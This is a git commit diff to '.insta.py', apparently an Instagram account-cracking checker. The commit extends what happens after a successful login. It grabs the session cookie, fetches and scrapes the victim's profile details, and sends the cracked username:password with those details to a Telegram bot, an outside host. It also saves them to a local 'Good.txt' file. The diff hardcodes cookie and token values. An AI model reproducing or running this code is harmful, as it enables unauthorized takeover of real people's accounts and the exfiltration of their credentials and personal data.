4199e1f52956a0de5b82929ff1c1ddc23b116015
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-22 02:15:49 +0300

    Update .insta.py

--- .insta.py
+++ .insta.py
@@ -1,3 +1,12 @@
+import os,sys
+os.system('clear')
+from bs4 import BeautifulSoup
+from colorama import Fore as fore
+import requests
+import subprocess
+import json
+from time import sleep
+import time
 import os,sys,random
 ######################################
 loglog='''
@@ -255,10 +264,43 @@ def instagram1():
 						print(logo2)
 						hits+=1
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-						boooom=f"GOOD: "+user+":"+pasw
+						sessd = login.cookies['sessionid']
+						url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
+						headers_get_info = {
+						    'accept': '*/*',
+						    'accept-encoding': 'gzip, deflate, br',
+						    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+						    'cookie': f'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid={sessd}; rur=VLL',
+						    'referer': 'https://www.instagram.com/accounts/edit/',
+						    'sec-fetch-dest': 'empty',
+						    'sec-fetch-mode': 'cors',
+						    'sec-fetch-site': 'same-origin',
+						    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
+						    'x-ig-app-id': '936619743392459',
+						    'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
+						    'x-requested-with': 'XMLHttpRequest'
+						}
+						data_get_info = {
+						    '__a': '1'
+						}
+						req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
+						email = str(req_get_info.json()['form_data']['username'])
+						url = f"https://www.instagram.com/{email}?hl=en"
+						r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
+						s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
+						soup = BeautifulSoup(r,'html.parser')
+						meta = soup.find("meta")
+						name = soup.find("meta", property="og:title")
+						name = name["content"].split("(")[0]
+						link_url = soup.find("meta", property="og:url")
+						description = soup.find("meta", property="og:description")
+						followers = description["content"].split(",")[0]
+						following = description["content"].split(",")[1]
+						posts = description["content"].split(",")[2].split("-")[0]
+						boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
 						with open('/sdcard/Good.txt', 'a') as ff:
-							ff.write(f"\nGOOD: "+user+":"+pasw)
+							ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
 					elif ('"message":"checkpoint_required"') in login:
 						os.system("clear")
 						print(logo2)
